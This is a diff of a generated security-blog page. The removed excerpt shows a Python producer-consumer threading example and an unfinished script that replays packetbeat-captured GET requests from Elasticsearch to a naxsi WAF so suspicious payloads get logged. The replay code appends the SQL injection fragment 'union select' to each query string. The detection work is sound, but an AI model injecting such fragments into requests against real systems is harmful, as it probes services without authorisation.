-ce.join()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>代码应该还有点问题，先记录下大概的流程：</p>
-<p>使用: <code>packetbeat</code>在A服务器抓包，格式化之后把数据发送到B服务器，存储在elk里面，然后B服务器画图对这些请求进行分析，比如某个接口报警之类的。</p>
-<p>这个时候在B服务器设置一个naxsi防火墙代理，然后把es里面的输出取出来，再发送一遍给B。经过测试，虽然这样子请求大部分都是404，但是如果请求中存在恶意payload，防火墙会记录日志。（所以这里的规则要设置的特别严格，严格到每个请求都不放过）</p>
-<p>上面的脚本就是在B防火墙的转发脚本demo，测试为GET请求，因为POST请求的body没有存储到es里面，脚本的大概思路是这样的：</p>
-<pre class="line-numbers language-none"><code class="language-none">因为es里面存储的数据包是这样的格式: packet-[year]-[days]
-所以先得到今天的日期，随便选100条，记录最新的时间戳，此时初始化完成。
-
-下面的请求都是基于这个时间戳来的，每隔10s，在这个时间戳的基础上，轮询请求一次es，然后组装起来发送到B服务器。
-记录下每次请求的最新日期，然后请求这个index，因为packet的格式: packet-[year]-[days],所以记录下每次请求的最新时间，格式化抓取最新的时间:
-
-latest_time &#x3D; res2[&#39;hits&#39;][&#39;hits&#39;][0][&#39;_source&#39;][&#39;@timestamp&#39;]
-
-当es的存储数据按照大于某个时间点去筛选的时候，只会出现匹配的时间条数，所以可以把请求的size设置得大一点
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>暂时的问题：</p>
-	
-
-	</div>
-  <a type="button" href="/2017/12/11/producer-consumer.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>代码捉急,先看例子:</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>jianshu<span class="token punctuation">.</span>com<span class="token operator">/</span>p<span class="token operator">/</span>d85a4329d0c2<span class="token operator">></span>
-<span class="token comment">#!/usr/bin/env python</span>
-<span class="token comment"># -*- coding: utf-8 -*-</span>
-
-<span class="token keyword">import</span> threading
-<span class="token keyword">import</span> Queue
-<span class="token keyword">import</span> random
-<span class="token keyword">import</span> time
-
-
-<span class="token keyword">class</span> <span class="token class-name">Producter</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token triple-quoted-string string">"""生产者线程"""</span>
-    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> t_name<span class="token punctuation">,</span> queue<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        self<span class="token punctuation">.</span>queue <span class="token operator">=</span> queue
-        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token operator">=</span>t_name<span class="token punctuation">)</span>
-
-    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-            randomnum <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span>
-            self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>put<span class="token punctuation">(</span>randomnum<span class="token punctuation">)</span>
-            <span class="token keyword">print</span> <span class="token string">'put num in Queue %s'</span> <span class="token operator">%</span>  randomnum
-            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-
-        <span class="token keyword">print</span> <span class="token string">'put queue done'</span>
-
-
-<span class="token keyword">class</span> <span class="token class-name">ConsumeEven</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token triple-quoted-string string">"""奇数消费线程"""</span>
-    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> t_name<span class="token punctuation">,</span> queue<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        self<span class="token punctuation">.</span>queue <span class="token operator">=</span> queue
-        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token operator">=</span>t_name<span class="token punctuation">)</span>
-
-    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
-            <span class="token keyword">try</span><span class="token punctuation">:</span>
-                queue_val <span class="token operator">=</span> self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>
-            <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>
-                <span class="token keyword">print</span> e
-                <span class="token keyword">break</span><span class="token punctuation">;</span>
-
-            <span class="token keyword">if</span> queue_val <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
-                <span class="token keyword">print</span> <span class="token string">'Get Even Num %s '</span> <span class="token operator">%</span> queue_val
-            <span class="token keyword">else</span><span class="token punctuation">:</span>
-                self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>put<span class="token punctuation">(</span>queue_val<span class="token punctuation">)</span>
-
-
-q <span class="token operator">=</span> Queue<span class="token punctuation">.</span>Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>
-pt <span class="token operator">=</span> Producter<span class="token punctuation">(</span><span class="token string">'producter'</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>
-ce <span class="token operator">=</span> ConsumeEven<span class="token punctuation">(</span><span class="token string">'consumeeven'</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>
-ce<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
-pt<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
-pt<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
-ce<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>照着写:</p>
-<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
-# coding: utf-8
-
-from elasticsearch import Elasticsearch
-import requests
-from Queue import Queue
-import time
-import threading
-import datetime
-
-es &#x3D; Elasticsearch(&#39;xxxxxx:9200&#39;, http_auth&#x3D;(&#39;user&#39;, &#39;password&#39;))
-
-
-class Producter(threading.Thread):
-	def __init__(self, queue):
-		threading.Thread.__init__(self)
-		self.queue &#x3D; queue
-		self.initime &#x3D; datetime.datetime.now().strftime(&#39;%Y.%m.%d&#39;)
-
-
-	def initsearch(self):
-		dsl_query &#x3D; &#123;
-		  &quot;query&quot;: &#123;
-		    &quot;match&quot;: &#123;
-		      &quot;method&quot;: &#123;
-		        &quot;query&quot;: &quot;GET&quot;,
-		        &quot;type&quot;: &quot;phrase&quot;
-		      &#125;
-		    &#125;
-		  &#125;,
-			&quot;size&quot;: 100,
-		&quot;sort&quot;: [&#123;&quot;@timestamp&quot;: &#123;&quot;order&quot;: &quot;desc&quot;&#125;&#125;]
-		&#125;
-		res &#x3D; es.search(index&#x3D;&quot;packetbeat-&quot; + self.initime, body&#x3D;dsl_query)
-		latest_time &#x3D; res[&#39;hits&#39;][&#39;hits&#39;][0][&#39;_source&#39;][&#39;@timestamp&#39;]
-		return latest_time
-
-
-	def run(self):
-		latest_time &#x3D; self.initsearch()
-		while 1:
-			lastindex &#x3D; latest_time.split(&#39;T&#39;)[0].replace(&#39;-&#39;, &#39;.&#39;)  # 获取最新的index
-			dsl_query2 &#x3D; &#123;
-				&quot;query&quot;: &#123;
-					&quot;bool&quot;: &#123;
-						&quot;must&quot;: &#123;
-							&quot;match&quot;: &#123;
-								&quot;method&quot;: &quot;GET&quot;
-							&#125;
-						&#125;,
-						&quot;filter&quot;: &#123;
-							&quot;range&quot;: &#123;
-								&quot;@timestamp&quot;: &#123;
-									&quot;gte&quot;: latest_time
-								&#125;
-							&#125;
-						&#125;
-					&#125;
-				&#125;,
-				&quot;sort&quot;: [&#123;&quot;@timestamp&quot;: &#123;&quot;order&quot;: &quot;desc&quot;&#125;&#125;],
-				&quot;size&quot;: 1000
-			&#125;
-			time.sleep(10)
-			res2 &#x3D; es.search(index&#x3D;&quot;packetbeat-&quot; + lastindex, body&#x3D;dsl_query2)
-			for hit in res2[&#39;hits&#39;][&#39;hits&#39;]:
-				# print hit[&#39;_source&#39;][&#39;@timestamp&#39;], hit[&#39;_id&#39;], hit[&#39;_source&#39;][&#39;path&#39;]
-				self.queue.put([hit[&#39;_source&#39;][&#39;path&#39;], hit[&#39;_source&#39;][&#39;http&#39;][&#39;request&#39;][&#39;params&#39;], hit[&#39;_source&#39;][&#39;method&#39;]])
-				print &quot;Put %s&quot; % hit[&#39;_id&#39;]
-				print hit[&#39;_source&#39;][&#39;@timestamp&#39;]
-			latest_time &#x3D; res2[&#39;hits&#39;][&#39;hits&#39;][0][&#39;_source&#39;][&#39;@timestamp&#39;]
-
-
-class Consumer(threading.Thread):
-	def __init__(self, queue):
-		threading.Thread.__init__(self)
-		self.queue &#x3D; queue
-
-	#
-	# def http_curl(self):
-	# 	# http_client &#x3D; AsyncHTTPClient()
-	# 	path &#x3D; self.request[0]
-	# 	param &#x3D; self.request[1]
-	# 	method &#x3D; self.request[2]
-	# 	if method &#x3D;&#x3D; &quot;GET&quot;:
-	# 		##判断get的param是否是空
-	# 		if not param:
-	# 			pass
-	# 		else:
-	# 			rep &#x3D; requests.get(&quot;http:&#x2F;&#x2F;xxxxxx:9999&quot; + path + &#39;?&#39; + param + &quot;union select&quot;)
-	# 			print &quot;Curl %s&quot; % self.request
-	# 			print rep.status_code
-	# 	else:
-	# 		#留着写POST请求判断
-	# 		pass
-
-
-	def run(self):
-		while 1:
-			try:
-				request &#x3D; self.queue.get()
-				path &#x3D; request[0]
-				param &#x3D; request[1]
-				method &#x3D; request[2]
-				if method &#x3D;&#x3D; &#39;GET&#39;:
-					if not param:
-						pass
-					else:
-						rep &#x3D; requests.get(&quot;http:&#x2F;&#x2F;xxxxx:9999&quot; + path + &#39;?&#39; + param + &quot;union select&quot;)
-				#else  写POST
-				print &quot;Get %s&quot; % request
-				print rep.status_code
-			except Exception as e:
-				raise e
-
-q &#x3D; Queue()
-pt &#x3D; Producter(q)
-ce &#x3D; Consumer(q)
-ce.start()
-pt.start()
-pt.join()
-ce.join()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>代码应该还有点问题，先记录下大概的流程：</p>
-<p>使用: <code>packetbeat</code>在A服务器抓包，格式化之后把数据发送到B服务器，存储在elk里面，然后B服务器画图对这些请求进行分析，比如某个接口报警之类的。</p>
-<p>这个时候在B服务器设置一个naxsi防火墙代理，然后把es里面的输出取出来，再发送一遍给B。经过测试，虽然这样子请求大部分都是404，但是如果请求中存在恶意payload，防火墙会记录日志。（所以这里的规则要设置的特别严格，严格到每个请求都不放过）</p>
-<p>上面的脚本就是在B防火墙的转发脚本demo，测试为GET请求，因为POST请求的body没有存储到es里面，脚本的大概思路是这样的：</p>
-<pre class="line-numbers language-none"><code class="language-none">因为es里面存储的数据包是这样的格式: packet-[year]-[days]
-所以先得到今天的日期，随便选100条，记录最新的时间戳，此时初始化完成。
-
-下面的请求都是基于这个时间戳来的，每隔10s，在这个时间戳的基础上，轮询请求一次es，然后组装起来发送到B服务器。
-记录下每次请求的最新日期，然后请求这个index，因为packet的格式: packet-[year]-[days],所以记录下每次请求的最新时间，格式化抓取最新的时间:
-
-latest_time &#x3D; res2[&#39;hits&#39;][&#39;hits&#39;][0][&#39;_source&#39;][&#39;@timestamp&#39;]
-
-当es的存储数据按照大于某个时间点去筛选的时候，只会出现匹配的时间条数，所以可以把请求的size设置得大一点
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>暂时的问题：</p>
-	
-	</div>
-  <a type="button" href="/2017/12/11/producer-consumer.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -984,7 +622,7 @@ latest_time &#x3D; res2[&#39;hits&#39;][&#39;hits&#39;][0][&#39;_source&#39;][&#
 		
 			<li><a href="/categories/CTF/">CTF<span>1</span></a></li>
 		
-			<li><a href="/categories/Fun/">Fun<span>3</span></a></li>
+			<li><a href="/categories/Fun/">Fun<span>4</span></a></li>
 		
 			<li><a href="/categories/Java/">Java<span>8</span></a></li>
 		
@@ -992,7 +630,7 @@ latest_time &#x3D; res2[&#39;hits&#39;][&#39;hits&#39;][0][&#39;_source&#39;][&#
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
 		
-			<li><a href="/categories/Pentest/">Pentest<span>45</span></a></li>
+			<li><a href="/categories/Pentest/">Pentest<span>46</span></a></li>
 		
 			<li><a href="/categories/Python/">Python<span>5</span></a></li>
 		
@@ -1013,6 +651,14 @@ latest_time &#x3D; res2[&#39;hits&#39;][&#39;hits&#39;][0][&#39;_source&#39;][&#
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/01/16/pay_vuln.html" ><i class="fa fa-file-o"></i>支付接口安全测试记录</a>
+      </li>
+    
+      <li>
+        <a href="/2022/11/08/pve_homelab.html" ><i class="fa fa-file-o"></i>PVE使用注意事项</a>
+      </li>
+    
+      <li>
         <a href="/2022/10/27/clickhouse-sql-inject.html" ><i class="fa fa-file-o"></i>ClickHouse注入测试记录</a>
       </li>
     
@@ -1022,14 +668,6 @@ latest_time &#x3D; res2[&#39;hits&#39;][&#39;hits&#39;][0][&#39;_source&#39;][&#
     
       <li>
         <a href="/2022/05/17/godzilla.html" ><i class="fa fa-file-o"></i>哥斯拉原理分析</a>
-      </li>
-    
-      <li>
-        <a href="/2022/04/14/memory-shell-1.html" ><i class="fa fa-file-o"></i>Java安全笔记(3)-内存马之Filter型</a>
-      </li>
-    
-      <li>
-        <a href="/2022/04/11/burpsuite-ext-dev.html" ><i class="fa fa-file-o"></i>BurpSuite插件开发注意事项</a>
       </li>
     
   </ul>
@@ -1047,7 +685,7 @@ latest_time &#x3D; res2[&#39;hits&#39;][&#39;hits&#39;][0][&#39;_source&#39;][&#
   <div class="container-narrow">
   <footer> <p>
   
-  &copy; 2022 JKme's Blog
+  &copy; 2023 JKme's Blog
   
       powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
 </p>
